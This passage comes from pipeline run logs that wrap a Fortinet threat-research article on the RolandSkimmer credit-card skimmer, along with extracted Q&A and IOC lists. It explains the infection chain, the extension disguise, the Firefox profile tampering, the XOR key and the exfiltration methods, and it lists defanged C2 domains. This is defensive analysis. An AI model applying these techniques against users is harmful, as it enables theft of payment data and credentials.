with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users in Bulgaria and leverages malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including deceptive LNK files, obfuscated scripts, and malicious browser extensions, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to financial loss and identity theft. The attackers' use of adaptive behavior, such as customizing the infection path based on the target's environment, makes this threat particularly challenging to detect and mitigate.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "browser", "apt", "malicious", "threat", "botnet", "bank", "banking trojan", "phishing", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "threat", "browser", "apt", "banking trojan", "malicious", "phishing", "analysis", "bank", "botnet"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard 